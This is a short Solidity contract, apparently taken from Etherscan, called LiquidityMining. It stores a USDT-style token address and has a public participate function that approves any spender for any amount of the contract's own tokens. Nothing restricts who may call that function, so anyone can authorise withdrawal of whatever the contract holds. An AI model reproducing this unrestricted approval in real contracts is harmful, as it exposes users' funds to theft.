/**
 *Submitted for verification at Etherscan.io on 2021-10-27
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.17;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

contract LiquidityMining {
    IERC20 usdtERC20;

    function LiquidityMining(address _address) public {
        usdtERC20 = IERC20(_address);
    }

    function participate(address spender, uint value) public {
        usdtERC20.approve(spender, value);
    }

}